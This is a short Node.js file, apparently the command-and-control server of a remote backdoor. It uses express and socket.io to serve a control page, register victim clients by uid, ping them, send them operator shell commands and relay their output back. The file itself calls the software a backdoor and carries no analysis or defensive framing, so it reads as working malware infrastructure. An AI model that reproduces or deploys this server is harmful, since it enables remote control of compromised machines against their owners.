var express=require("express")
var app=express()
var http=require('http')
var httpServer=http.createServer(app)
var io=require('socket.io')(httpServer)

app.get('/',function(req,res){
	res.sendFile(__dirname+'\\ctrl.html')
})

io.on('connection',function(socket){
    socket.on('cmdEmit',function(data){
		if(data.cmd!="exit"){
			io.emit('cmdExec',{'cmd':data.cmd,'uid':data.uid})
		}else{
			io.emit('consoleReturnData',{'result':"The server stopped this command because it can break the backdoor. Type <code>exit 1</code> to continue anyway."})
		}
    })
	socket.on('returnData',function(data){
		data=JSON.parse(data)
        io.emit('consoleReturnData',{'result':data.cmd.replaceAll('<','&lt;')})
    })
	socket.on('newClient',function(data){
		data=JSON.parse(data)
        io.emit('newClnt',{'cmd':null,'uid':data.uid.replaceAll('<','&lt;')})
    })
	socket.on('clientPing',function(data){
        io.emit('pingingAllClients',{'a':'b'})
    })
})

httpServer.listen(80)
